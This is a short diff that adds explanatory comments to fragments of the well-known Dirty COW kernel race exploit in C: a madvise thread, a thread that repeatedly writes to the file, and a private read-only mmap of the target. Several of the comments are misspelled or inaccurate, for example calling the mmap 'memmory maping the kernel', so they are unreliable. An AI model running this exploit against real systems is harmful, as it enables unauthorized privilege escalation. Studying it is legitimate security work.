@@ -9,10 +9,13 @@
 #include<string.h>
 #include<pthread.h>
 
+//struct stat it contains file offset and size
 struct stat s;
 const char* name;
+//void *map used map the memory page
 void *map;
 
+//this function continuosly use mark the memmory region of kernel
 void *madvisethread(void *arg){
   char *str;
   str = (char*)arg;
@@ -22,6 +25,8 @@ void *madvisethread(void *arg){
   }
   printf("madvise %d\n\n",c);
 }
+
+//this function try to write on the file continuously
 
 void *procthreadself(void *args){
   char *str;
@@ -53,6 +58,7 @@ int main(int argc,char *argv[]){
 
   fstat(f,&s);
   name = argv[1];
+  //memmory maping the kernel
   map = mmap(NULL,s.st_size,PROT_READ,MAP_PRIVATE,f,0);
   printf("mmap %zx\n\n",(uintptr_t)map);
 
